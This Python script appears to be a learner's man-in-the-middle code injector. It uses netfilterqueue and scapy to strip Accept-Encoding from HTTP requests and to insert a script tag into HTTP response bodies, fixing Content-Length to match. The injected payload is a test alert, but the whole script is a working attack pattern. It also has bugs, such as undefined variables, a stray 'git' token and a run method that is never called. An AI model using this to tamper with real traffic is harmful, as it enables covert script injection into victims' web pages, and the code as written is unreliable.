#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
#del and scapy will auto complete for each modified packet
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
#check packets RAW layer
    if scapy_packet.haslayer(scapy.RAW):
        load = scapy_packet.hasLayer(scapy.Raw).load
#check packets destination port for 80 (http) REQUESTS
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")git
#regex to replace the first arg with a empty string
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
#check packets source port for 80 (http) RESPONSES
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
#in the captured packet replace the body in the load field with a script
            load = load.replace("</body>", injection_code + "</body>")
#use regex to search for Content-Length in entire packet; ?: will search for item but not return it
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search:
#group(1) matches second item from entire str above (\d*) digits
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
#must put new_content_length as string because replace method only works with strings
                load = load.replace(content_length, str(new_content_length))
#if state if load is not the same as the scapy packet Raw layer load then modify the packet
        if load != scapy_packet[scapy.Raw].load:
#create new packet by replacing captured scapy_packet with the new modified load
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

#create instance of queue
queue = netfilterqueue.NetfilterQueue()
#bind queue to queue num 0 and callback to func process_packet
queue.bind(0, process_packet)
queue.run
